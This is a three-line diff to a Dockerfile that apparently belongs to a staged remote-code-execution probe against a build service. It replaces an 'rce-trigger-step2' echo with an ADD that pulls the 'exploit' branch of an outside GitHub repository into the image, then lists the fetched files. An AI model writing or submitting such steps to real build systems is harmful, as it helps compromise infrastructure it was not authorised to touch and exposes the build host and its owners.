@@ -1,2 +1,3 @@
 FROM alpine:3.19
-RUN echo rce-trigger-step2
+ADD https://github.com/kernel-ops/test.git#exploit:src /tmp/data/
+RUN ls -laR /tmp/data/ 2>&1 | head -200 || true
